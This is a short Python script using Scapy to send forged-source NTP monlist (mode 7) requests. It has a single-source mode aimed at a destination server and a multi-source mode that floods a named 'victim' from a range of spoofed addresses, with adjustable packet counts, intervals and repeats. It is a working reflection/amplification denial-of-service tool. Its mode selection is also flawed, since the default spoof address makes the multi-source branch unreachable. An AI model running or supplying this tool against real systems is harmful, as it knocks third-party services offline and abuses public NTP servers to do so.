import argparse
import time

from scapy.all import *

# NTP mode 7 (private) monlist request — 8 bytes total.
# Byte 0: R=0, M=0, VN=2, Mode=7              → 0x17
# Byte 1: auth=0, sequence=0                  → 0x00
# Byte 2: implementation = 3 (IMPL_XNTPD)     → 0x03
# Byte 3: request code = 42 (REQ_MON_GETLIST_1) → 0x2A
# Bytes 4-7: err + items + mbz + item_size    → all zero for a request
MONLIST_PAYLOAD = bytes([0x17, 0x00, 0x03, 0x2A, 0x00, 0x00, 0x00, 0x00])


def send_single(spoof, dst, port, count, interval):
    pkt = IP(src=spoof, dst=dst) / UDP(sport=12345, dport=port) / MONLIST_PAYLOAD
    for _ in range(count):
        send(pkt, verbose=False)
        if interval > 0:
            time.sleep(interval)


def send_many(base, start, count, per_source, victim, port, interval, repeat):
    src_ips = [f"{base}{start + i}" for i in range(count)]
    for _ in range(repeat):
        for src in src_ips:
            pkt = IP(src=src, dst=victim) / UDP(sport=12345, dport=port) / MONLIST_PAYLOAD
            for _ in range(per_source):
                send(pkt, verbose=False)
                if interval > 0:
                    time.sleep(interval)


if __name__ == '__main__':
    p = argparse.ArgumentParser(description='Send spoofed NTP monlist (mode 7) requests in single-source or multi-source mode')
    p.add_argument('--spoof', default="215.95.122.182", help='single spoofed source IP')
    p.add_argument('--dst', help='destination IP for single-source mode')
    p.add_argument('--base', default="127.0.0", help='base prefix for source IPs, e.g. 127.0.0.')
    p.add_argument('--start', type=int, default=2, help='start index (append to base)')
    p.add_argument('--count', type=int, default=50, help='number of packets (single-source) or distinct source IPs (multi-source)')
    p.add_argument('--per-source', type=int, default=1, help='packets to send per spoofed source in multi-source mode')
    p.add_argument('--victim', help='victim IP (destination) for multi-source mode')
    p.add_argument('--port', type=int, default=123, help='destination port')
    p.add_argument('--interval', type=float, default=0.0, help='seconds between packets')
    p.add_argument('--repeat', type=int, default=1, help='repeat the whole set N times in multi-source mode')
    args = p.parse_args()

    if args.spoof or args.dst:
        if not args.spoof or not args.dst:
            p.error('both --spoof and --dst are required for single-source mode')
        send_single(args.spoof, args.dst, args.port, args.count, args.interval)
    else:
        if not args.base or not args.victim:
            p.error('either use --spoof/--dst or provide --base and --victim')
        send_many(args.base, args.start, args.count, args.per_source, args.victim, args.port, args.interval, args.repeat)